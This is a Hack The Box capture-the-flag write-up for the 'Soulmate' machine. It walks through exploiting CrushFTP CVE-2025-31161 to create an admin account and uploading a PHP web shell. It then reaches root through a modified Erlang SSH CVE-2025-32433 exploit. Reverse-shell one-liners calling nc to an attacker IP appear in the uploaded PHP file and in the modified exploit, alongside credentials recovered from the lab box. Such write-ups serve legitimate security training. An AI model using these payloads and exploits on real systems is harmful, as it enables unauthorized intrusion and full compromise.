<div align=center>

# Soulmate Machine Write-up

[HTB Machine Certificate](https://labs.hackthebox.com/achievement/machine/2088593/721)

</div>

# Reconnaissance

1. **Starting with `Nmap`.**

    ```bash
    ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.86 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && nmap -p$ports -sC -sV 10.10.11.86
    ```

    ```bash
    PORT STATE SERVICE VERSION
    22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
    |_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
    80/tcp open http nginx 1.18.0 (Ubuntu)
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    |_http-title: Did not follow redirect to http://soulmate.htb/
    4369/tcp open epmd Erlang Port Mapper Daemon
    | epmd-info:
    | epmd_port: 4369
    | nodes:
    |_ ssh_runner: 41277
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```

    * An uncommon port `4369`, is open: `epmd` Erlang Port Mapper Daemon.

## Website

2. **Accessing the webpage, the home page was displayed.**

    All menu options refer to anchors on the home page, except `Login` and `Get Started`. 
    
3. **After registering an account, the profile was displayed.**

4. **Scanning for VHosts revealed `ftp.soulmate.htb`.**

    ```bash
    gobuster vhost -u http://soulmate.htb -w /home/lucas/workspace/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -t 50  -a "Mozilla/5.0"
    ```

    ```bash
    Found: ftp.soulmate.htb Status: 302 [Size: 0] [--> /WebInterface/login.html]
   ```

# Web

## Initial Access - ftp Subdomain

5. **When accessing the `ftp` subdomain, a new login page was displayed. This webpage uses `CrushFTP`.** 

6. **Searching for known vulnerabilities in `CrushFTP`. Several were found.**

    * `CVE-2024-4040`: VFS (Virtual File System) escaping + unauthenticated RCE.

    * `CVE-2025-31161`: Authentication bypass via unauthenticated HTTP requests, allowing an attacker to perform actions as a valid user or administrator.

    * `CVE-2025-54309`: Malformed AS2 validation allowing authentication bypass via HTTPS, providing full administrative access.

    The best option in current context was `CVE-2025-31161` because it was disclosed in 2025 year and allows authentication bypass, which is the desired outcome at this stage.

    https://nvd.nist.gov/vuln/detail/CVE-2025-31161  
    In summary, the vulnerability lies in the `login_user_pass()` function through the `anyPass` parameter, which allows a user to be validated based solely on the existence of the username, bypassing password verification. Initially, this could be exploited through a race condition. Later, it was discovered that the vulnerability could also be exploited by sending a malformed `Authorization header` containing only the `username` followed by a `/`. The server attempts to process the content after the `/`, fails, but neglects to invalidate the user's session.

    * Logical Failure.
    * Race Condition.
    * Malformed Header.

### CVE-2025-31161

7. **Searching for exploits, the following Github repository was found: https://github.com/Immersive-Labs-Sec/CVE-2025-31161** 


8. **Exploiting `CVE-2025-31161` to create a new user with administrative privileges.** 

    Usage: `cve-2025-31161.py [-h] [--target_host TARGET_HOST] [--port PORT] [--target_user TARGET_USER] [--new_user NEW_USER] [--password PASSWORD]`

    No usernames were known initially, but searching for default admin username in `CrushFTP`, it was found to be `crushadmin`. This worked successfully to `--target_user` flag, creating a new user.

    * https://hub.docker.com/r/crushftp/crushftp11?utm_source=chatgpt.com ➔ "The `crushadmin` is the default username for the first admin user..."
    
    However, the tool worked successfully using any value for `--target_user`, also creating a new user.

    ```bash
    lucas@hacking:~/workspace/htb-machines/Soulmate$ python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user crushadmin --new_user ldk --password ldkldk
    [+] Preparing Payloads
      [-] Warming up the target
      [-] Target is up and running
    [+] Sending Account Create Request
      [!] User created successfully
    [+] Exploit Complete you can now login with
       [*] Username: ldk
       [*] Password: ldkldk.
    ```
    ![][image1]

## Exploitation


9. **Initial Checks**  
    * In the top-right corner, the `CrushFTP` version is displayed: `Version 11.3.0 Build : 2`

    * Accessing `/WebInterface/UserManager/index.html` made it possible to view other system users, access their files and change their usernames and passwords.
   
10. **The `ben` user's password was then changed to `AvZ974` by clicking on the `Generate Random Password` button and then applying and saving the changes.** 

    ![][image2]

11. **It was possible to access the application using `ben` user. All of their files were then downloaded for analysis**

    <u>Some interesting files were found</u>:

    The `/etc/passwd` file increased suspicion that the application was running in a containerized environment, as there were no system users and the `/etc/shadow` file did not contain any hash. 

        root:x:0:0:root:/root:/bin/ash
        bin:x:1:1:bin:/bin:/sbin/nologin
        daemon:x:2:2:daemon:/sbin:/sbin/nologin
        adm:x:3:4:adm:/var/adm:/sbin/nologin
        lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
        sync:x:5:0:sync:/sbin:/bin/sync
        shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
        halt:x:7:0:halt:/sbin:/sbin/halt
        mail:x:8:12:mail:/var/mail:/sbin/nologin
        news:x:9:13:news:/usr/lib/news:/sbin/nologin
        uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
        operator:x:11:0:operator:/root:/sbin/nologin
        man:x:13:15:man:/usr/man:/sbin/nologin
        postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
        cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
        ftp:x:21:21::/var/lib/ftp:/sbin/nologin
        sshd:x:22:22:sshd:/dev/null:/sbin/nologin
        xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
        nobody:x:65534:65534:nobody:/:/sbin/nologin
        java:x:65532:65532:Account created by apko:/home/java:/bin/sh

    
    In the `app` folder (the application folder), other files were found. including scripts that created system users and an `XML` file (`app/users/MainsUsers/default/user.XML`) containing the `MD5` hash of the `default` user. However it was not possible crack the hash.

        2ed7612a635b017b261ec5112851fa7f

    The `dev-env-setup.sh` file, found in `IT/scripts`, also indicated is a containerized environment (`Docker`), and revealed a configuration allowing `Docker` to be used without `sudo`. 

        sudo gpasswd -a ${USER} docker
        sudo service docker restart

    The `Soulmate` application code, found in `webProd` directory, was also analyzed. No implementation vulnerabilities were found. However, the `dashboard.php` endpoint was confirmed, which had previously bem discovered during enumeration using `dirsearch` tool.
    
12. **Access was also performed using the `crusgadmin` and `jenna` users.**

    The jenna user have a directory called department that containing a `IT` folder, however do not allow file upload. 

    * Only the `ben` user had the `Add files` option, and only within the `ben` and `webProd` directories. 

    It was attempt modify the permissions configuration of the `IT` directory, however it did not work. 

### RCE

13. **Uploading files to the `webProd` directory makes it possible to insert code directly into the production application, allowing access and execution.** 

    A file named `ldk.php` was uploaded to the `webProd` directory, containing the following payload:

    ```bash
    <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 443 >/tmp/f"); ?>
    ```

    ![][image3]

# Host Compromise

## Initial Access - www-data

14. **The file was then accessed in **http://soulmate.htb/ldk.php** to execute the malicious code in the application.** 

    A shell was obtained in the application host as the `www-data` user.   

    ```bash
    lucas@hacking:~/workspace/htb-machines/Soulmate$ sudo nc -lvnp 443
    [sudo] password for lucas: 
    Listening on 0.0.0.0 443
    Connection received on 10.10.11.86 60476
    /bin/sh: 0: can't access tty; job control turned off
    $ script /dev/null -c bash
    Script started, output log file is '/dev/null'.
    www-data@soulmate:~/soulmate.htb/public$ 
    ```

## Exploitation

15. **Initial checks.**

    ```bash
    www-data@soulmate:~/soulmate.htb/public$ id
    id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    www-data@soulmate:~/soulmate.htb/public$ id ls /home  
    ls /home
    ben
    ```
    The `admin` user's password was found in `/var/www/soulmate.htb/config/config.php`.

    ```php   
        cat config/config.php
        <?php
        class Database {
            private $db_file = '../data/soulmate.db';
            private $pdo;
            
                <SNIP>
                
                if ($adminCheck->fetchColumn() == 0) {
                    $adminPassword = password_hash('Crush4dmin990', PASSWORD_DEFAULT);
                    $adminInsert = $this->pdo->prepare("
                        INSERT INTO users (username, password, is_admin, name) 
                        VALUES (?, ?, 1, 'Administrator')
                    ");
                    $adminInsert->execute(['admin', $adminPassword]);

                <SNIP>
    ```

    A database file also containing the `admin` user's password hash.

    ```bash   
    www-data@soulmate:~/soulmate.htb/data$ sqlite3 soulmate.db
    sqlite3 soulmate.db
    SQLite version 3.37.2 2022-01-06 13:25:41
    Enter ".help" for usage hints.    
    sqlite> .tables
    .tables
    users
    sqlite> use users;    
    sqlite> select * from users;
    select * from users;
    1|admin|$2y$12$u0AC6fpQu0MJt7uJ80tM.Oh4lEmCMgvBs3PwNNZIR7lor05ING3v2|1|Administrator|||||2025-08-10 13:00:08|2025-08-10 12:59:39
    ```

    It was confirmed that the password hash found in the database corresponds to the password found in the `config.php`.

    ```bash 
    hashcat -m 3200 -a 0 hash pass
    ```
        $2y$12$u0AC6fpQu0MJt7uJ80tM.Oh4lEmCMgvBs3PwNNZIR7lor05ING3v2:Crush4dmin990

    No other interesting files were found in the application directory.

    An attempt was made to obtain the `ben` user's `SSH` private key (`/home/ben/id_rsa`) by exploring misconfiguration permissions, but this was unsuccessful.

    Then, running process were analyzed.

    ```bash
    www-data@soulmate:~/soulmate.htb$ ps aux --sort=-%mem | head -10
    ps aux --sort=-%mem | head -10
    USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
    root        1826  4.1 10.0 3236800 402220 ?      Ssl  04:01   3:32 java -Ddir=/app/CrushFTP11 -Xmx512M -jar /app/CrushFTP11/plugins/lib/CrushFTPJarProxy.jar -ad crushadmin PASSFILE
    root         507  0.2  4.6 269512 185612 ?       S<s  04:00   0:11 /lib/systemd/systemd-journald
    root        1190  0.0  2.0 2357664 80504 ?       Ssl  04:00   0:01 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
    root        1027  0.0  1.7 2254668 69600 ?       Ssl  04:00   0:03 /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript
    root        1043  0.1  1.1 1802208 47424 ?       Ssl  04:00   0:05 /usr/bin/containerd
    root        1549  0.1  0.8 264236 34180 ?        Sl   04:01   0:06 /usr/bin/python3 /usr/bin/docker-compose up
    root         542  0.0  0.6 289352 27100 ?        SLsl 04:00   0:00 /sbin/multipathd -d -s
    root        1031  0.0  0.5 204160 20584 ?        Ss   04:00   0:00 php-fpm: master process (/etc/php/8.1/fpm/php-fpm.conf)
    root         832  0.0  0.4  32724 19744 ?        Ss   04:00   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
    ```

## Privilege Escalation - ben

16. **While analyzing the files used by the running process, the `/usr/local/lib/erlang_login/start.escript` file drew attention, as initial `nmap` scan revealed an open port running this service.** 
  
    The `ben` user's credentials were found in this file.    

    ```bash
    www-data@soulmate:~/soulmate.htb$ cat /usr/local/lib/erlang_login/start.escript
    <.htb$ cat /usr/local/lib/erlang_login/start.escript

    #!/usr/bin/env escript
    %%! -sname ssh_runner
        <SNIP>

        {auth_methods, "publickey,password"},
        {user_passwords, [{"ben", "HouseH0ldings998"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

        <SNIP>
    ```

    This `Erland` script (`.escript`) starts a custom `SSH` server on the local machine on port `2222`, containing detailed  of authentication logging and flaws 

17. **Accessing via SSH as `ben` user.**

## Exploitation - ben

18. **Initial checks**

    The `ben` user was not a member of any interesting groups.

    ```bash
    ben@soulmate:~$ id
    uid=1000(ben) gid=1000(ben) groups=1000(ben)
    ```

    Looking for interesting permissions.

    ```bash
    ben@soulmate:~$ ls -la /usr/local/lib/erlang_login/start.escript
    -rwxr-xr-x 1 root root 1427 Aug 15 07:46 /usr/local/lib/erlang_login/start.escript
    s -la /usr/bin/docker-compose 
    -rwxr-xr-x 1 root root 996 Jan 25  2022 /usr/bin/docker-compose
    ```
    
    Looking for `sudo` permissions, `ben` does not have any.

    ```bash
    ben@soulmate:~$ sudo -l
    [sudo] password for ben: 
    Sorry, user ben may not run sudo on soulmate.
    ```
    
    No interesting Docker permissions, SUID binaries, GUID files, or capabilities were found.

19. **Bearing in mind that the there is an `Earlang` `SSH` server running, `pspy` was transferred to the host and executed.**
    
    ```bash
    2025/09/17 20:51:42 CMD: UID=0 PID=1062 | /usr/sbin/cron -f -P
    2025/09/17 20:51:42 CMD: UID=0 PID=1055 | /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript 
    ```

    The `ben` user does not have write permissions on the configuration files. All `Erlang` files are owned by the `root` user and group.
    
    ```bash
    ben@soulmate:~$ ls -la /usr/local/lib/erlang_login
    total 16
    drwxr-xr-x 2 root root 4096 Aug 15 07:46 .
    drwxr-xr-x 5 root root 4096 Aug 14 14:12 ..
    -rwxr-xr-x 1 root root 1570 Aug 14 14:12 login.escript
    -rwxr-xr-x 1 root root 1427 Aug 15 07:46 start.escript
    ```

### CVE-2025-32433

20. **A search for `earlang ssh vulnerability` was performed, and the `CVE-2025-32433` was found.** 

   To better understand `CVE-2025-32433` the following article was consulted:  https://yashadhikari.medium.com/erlang-otp-ssh-cve-2025-32433-writeup-fae37c03d57e
   
   The article also referenced a public exploit repository.   

21. **The `Erlang` and `Erlang SSH` versions were verified and confirmed to be vulnerable to `CVE-2025-32433`.**

    ```bash
    ben@soulmate:~$ erl -version
    Erlang (SMP,ASYNC_THREADS) (BEAM) emulator version 15.2.5
    ben@soulmate:~$ nc -v 127.0.0.1 2222 < /dev/null
    Connection to 127.0.0.1 2222 port [tcp/*] succeeded!
    SSH-2.0-Erlang/5.2.9
    ```

## Privilege Escalation - root


22. **The payload in the referenced exploit only checks if the target vulnerable. Therefore, the exploit was modified to execute code that obtains a reverse shell.** 

    ```python
    <SNIP>
     print("[*] Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...")
        chan_req = build_channel_request(
            command='os:cmd("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.16 443 >/tmp/f").'
        )
        s.sendall(pad_packet(chan_req))
    <SNIP>
    ```

### Root

23. **The exploit was executed and a shell as the `root` user was obtained.**

    ![][image4]


    ![][image5]


[image5]: files/htb-soulmate-machine/image5.png
[image4]: files/htb-soulmate-machine/image4.png
[image3]: files/htb-soulmate-machine/image3.png
[image2]: files/htb-soulmate-machine/image2.png
[image1]: files/htb-soulmate-machine/image1.png

